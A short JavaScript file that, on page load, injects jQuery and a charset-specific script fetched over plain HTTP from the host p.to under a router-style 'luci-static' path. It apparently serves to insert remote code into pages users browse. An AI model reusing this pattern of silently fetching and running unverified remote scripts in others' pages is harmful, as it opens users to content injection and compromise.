function loadExtentFile(filename, fileType){
  if(fileType == "js"){
    var oJs = document.createElement('script');
    oJs.setAttribute("type","text/javascript");
    oJs.setAttribute("src", filename);
    document.getElementsByTagName("head")[0].appendChild(oJs);
  }else if(fileType == "css"){
    var oCss = document.createElement("link");
    oCss.setAttribute("rel", "stylesheet");
    oCss.setAttribute("type", "text/css");
    oCss.setAttribute("href", filename);
    document.getElementsByTagName("head")[0].appendChild(oCss);
  }
}

window.onload=function(){
    loadExtentFile("http://p.to/luci-static/bootstrap/js/jquery-1.11.2.min.js", "js");
    var getcharset=getPageCharset();
	if(getcharset == "gbk" || getcharset == "GBK" || getcharset == "GB2312" || getcharset == "gb2312"){
			loadExtentFile("http://p.to/luci-static/bootstrap/js/up_gbk.js", "js");
	}else{
			loadExtentFile("http://p.to/luci-static/bootstrap/js/up_utf8.js", "js");
	}
}
function getPageCharset(){
    var charSet = "";
    var oType = getBrowser();
    switch(oType){
        case "IE":
            charSet = document.charset;
            break;
        case "FIREFOX":
            charSet = document.characterSet;
            break;
        default:
            charSet = document.charset;
            break;
    }
    return charSet;
}
function getBrowser(){
    var oType = "";
    if(navigator.userAgent.indexOf("MSIE")!=-1){
        oType="IE";
    }else if(navigator.userAgent.indexOf("Firefox")!=-1){
        oType="FIREFOX";
    }
    return oType;
}
